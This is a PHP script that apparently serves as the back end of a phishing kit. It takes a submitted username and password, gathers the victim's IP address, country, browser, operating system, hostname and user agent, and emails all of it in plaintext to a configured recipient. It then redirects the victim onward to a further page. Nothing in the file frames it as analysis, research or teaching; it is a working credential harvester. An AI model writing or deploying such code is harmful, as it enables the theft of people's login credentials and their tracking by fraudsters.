<?php

session_start();
require_once '../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

$un = $_POST["uname"];
$pw = $_POST["pword"];
$app = base64_encode($un);
$message = '';
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$un."\n";
$message .= "Password: ".$pw."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got a new message from $ip ($cn)";
$headers = "From: Notifications <noreply>\n";
$headers .= "Reply-To: ".$_POST["uname"]."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($un) || empty($pw)) {
header('Location: ?app='.$app);
}
else {
mail($to,$subject,$message,$headers);
	header('Location: auth.php?app='.$app);
}

?>